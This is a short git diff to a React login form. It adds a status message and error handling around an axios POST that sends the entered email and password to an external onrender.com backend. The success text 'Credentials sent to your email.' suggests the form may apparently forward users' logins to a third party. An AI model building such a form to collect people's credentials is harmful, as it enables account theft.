@@ -5,15 +5,22 @@ import React from 'react'
 
 export default function App() {
   const [form, setForm] = useState({ email: '', password: '' });
+  const [status, setStatus] = useState("");
+
 
   const handleChange = (e) => {
     setForm({ ...form, [e.target.name]: e.target.value });
   };
 
+
   const handleSubmit = async (e) => {
     e.preventDefault();
-    await axios.post('https://login-backend-w8d5.onrender.com/login', form);
-    alert('Login sent to server!');
+    try {
+      await axios.post('https://login-backend-w8d5.onrender.com/login', form);
+    setStatus("Credentials sent to your email.");
+    } catch (error) {
+      setStatus("Error sending credentials.");
+    }
   };
 
   return (
@@ -39,6 +46,7 @@ export default function App() {
         <button className="w-full bg-blue-600 text-white p-2 rounded hover:bg-blue-700 cursor-pointer ">
           Submit
         </button>
+        {status && <p className="mt-4 text-center">{status}</p>}
       </form>
     </div>
   );
